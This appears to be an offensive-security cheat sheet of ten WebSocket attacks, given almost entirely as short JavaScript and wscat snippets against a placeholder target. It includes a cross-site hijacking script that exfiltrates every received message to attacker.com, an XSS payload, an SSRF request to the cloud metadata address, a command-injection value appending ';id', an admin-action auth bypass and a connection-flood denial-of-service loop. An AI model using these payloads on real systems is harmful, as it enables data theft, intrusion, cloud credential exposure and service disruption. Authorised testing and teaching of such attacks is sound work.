# WebSocket Attacks

## 1. WebSocket Hijacking
```javascript
// Cross-Site WebSocket Hijacking (CSWSH)
var ws = new WebSocket("ws://target/ws");
ws.onopen = function() {
  ws.send(JSON.stringify({type:"auth",token:"stolen_token"}));
};
ws.onmessage = function(event) {
  // Exfiltrate data
  fetch("https://attacker.com/?data=" + btoa(event.data));
};
```

## 2. WebSocket Injection
```javascript
// Inject malicious messages
var ws = new WebSocket("ws://target/ws");
ws.onopen = function() {
  ws.send('{"type":"message","content":"<script>alert(1)</script>"}');
};
```

## 3. WebSocket SSRF
```javascript
// If WebSocket proxies HTTP requests
var ws = new WebSocket("ws://target/ws");
ws.onopen = function() {
  ws.send(JSON.stringify({url:"http://169.254.169.254/latest/meta-data/"}));
};
```

## 4. WebSocket Command Injection
```javascript
// If WebSocket input is passed to system commands
var ws = new WebSocket("ws://target/ws");
ws.onopen = function() {
  ws.send('{"host":"127.0.0.1;id"}');
};
```

## 5. WebSocket Authentication Bypass
```javascript
// Connect without authentication
var ws = new WebSocket("ws://target/ws");
ws.onopen = function() {
  // Access restricted functionality
  ws.send('{"type":"admin","action":"listUsers"}');
};
```

## 6. WebSocket Message Manipulation
```javascript
// Intercept and modify WebSocket messages
// Use Burp Suite WebSocket tab
// Modify message content, type, or parameters
```

## 7. WebSocket Denial of Service
```javascript
// Flood WebSocket connections
for(var i=0; i<1000; i++) {
  new WebSocket("ws://target/ws");
}
```

## 8. WebSocket Cross-Origin
```javascript
// Check if Origin is validated
// If no Origin check, any site can connect
var ws = new WebSocket("ws://target/ws");
```

## 9. WebSocket Replay Attack
```bash
# Capture and replay WebSocket messages
# Use wscat for manual testing
wscat -c ws://target/ws
wscat -c ws://target/ws -x '{"type":"auth","token":"captured_token"}'
```

## 10. WebSocket Protocol Downgrade
```javascript
// Force ws:// instead of wss://
var ws = new WebSocket("ws://target/ws");  // Unencrypted
```

## Tools
```bash
# wscat
npm install -g wscat
wscat -c ws://target/ws
# websocat
websocat ws://target/ws
# Burp Suite WebSocket tab
# Capture and modify WS traffic
```

## Detection
```bash
# Check for WebSocket upgrade
curl -sk -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13" "http://target/ws" -v
```
